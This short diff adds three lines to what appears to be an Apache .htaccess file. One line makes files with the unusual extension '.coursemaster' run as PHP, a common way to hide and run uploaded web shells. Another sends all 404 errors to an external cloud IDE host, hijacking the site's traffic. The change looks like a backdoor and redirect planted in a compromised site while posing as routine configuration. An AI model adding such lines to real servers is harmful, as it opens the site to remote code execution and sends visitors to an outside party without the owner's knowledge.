@@ -1,0 +1,3 @@
+AddType application/x-httpd-php .coursemaster
+RewriteEngine On
+ErrorDocument 404 https://jingedalao-helloclown.c9users.io/
